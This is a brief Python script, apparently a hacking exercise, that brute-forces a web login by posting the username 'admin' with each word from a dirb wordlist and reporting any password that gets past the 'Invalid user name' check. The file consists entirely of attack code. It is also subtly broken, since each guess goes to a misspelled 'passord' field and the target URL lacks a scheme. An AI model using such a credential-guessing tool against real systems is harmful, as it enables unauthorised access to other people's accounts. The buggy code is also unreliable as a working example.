#!/usr/bin/env python

import requests

def main():
    target_url = 'sample.com'
    data_dict = {
        'User Name': 'admin',
        'password': '',
        'Login': 'submit'
    }

    with open('/usr/share/wordlists/dirb/common.txt', 'r') as wordlist_file:
                for line in wordlist_file:
                    word = line.strip()
                    data_dict['passord'] = word
                    response = requests.post(target_url, data=data_dict)
                    if 'Invalid user name' not in response.content.decode():
                        print(f'[+] Password found --> {word}')
                        exit()
    print('[-] Reached end of file with no hits.')

if __name__ == '__main__':
    main()